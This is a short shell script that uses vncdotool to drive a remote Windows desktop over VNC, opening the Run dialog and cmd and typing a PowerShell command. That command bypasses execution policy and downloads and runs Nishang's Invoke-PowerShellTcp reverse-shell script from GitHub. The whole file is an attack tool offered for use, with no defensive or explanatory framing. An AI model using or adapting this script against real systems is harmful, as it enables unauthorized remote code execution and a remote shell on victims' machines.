#!/bin/sh
 python2 vncdotool/vncdotool/command.py -s $1 \
     pause 2 \
     key meta-r \
     pause 2 \
     type "cmd" \
     key enter \
     pause 2 \
     type "powershell -ExecutionPolicy Bypass IEX(New-Object Net.WebClient).DownloadString(\"\"\"https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1\"\"\")" \
     pause 2